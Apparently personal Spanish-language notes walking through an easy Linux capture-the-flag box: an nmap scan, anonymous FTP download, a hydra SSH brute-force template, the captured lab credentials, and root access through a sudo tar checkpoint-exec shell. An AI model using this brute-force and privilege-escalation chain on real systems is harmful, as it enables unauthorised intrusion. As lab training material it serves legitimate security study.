#Linux #Easy 
### Scan
```css
sudo nmap -p- --open -sCV -sS --min-rate 3000 -n -vvv -Pn 10.10.211.59
```
### 
```css
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.203.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.59 seconds
```
parece que tenemos conexión con el puerto 21 ftp de manera anónima (anonymous)
### Puerto 21 ftp
```c 
ftp anonymous@10.10.211.59

mget * (descarga todo el contenido en nuestro directorio)
```

### Con los archivos que hemos coseguido vamos a realizar un ataque de fuerza bruta contra el pueto ssh

```css 
	hydra -l <nombre_de_usuario> -P <ruta_al_archivo_de_contraseñas> ssh://<dirección_ip>:22
```

![[2023-10-29_23-17.png]]

### Credenciales ssh
```c
	username: lin
	password: RedDr4gonSynd1cat3
```

# Enumeración básica sistema
```css
	find / -perm -4000 2>/dev/null
```
# Permisos sudo
```css
	sudo -l
```
# Permisos SUID
```css
 /bin/tar
```

### para escalar privilegios con el binario /bin/tar podemos ejecutar el comando (siempre que tengamos permisos sudo con el actual usuario)

```c
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```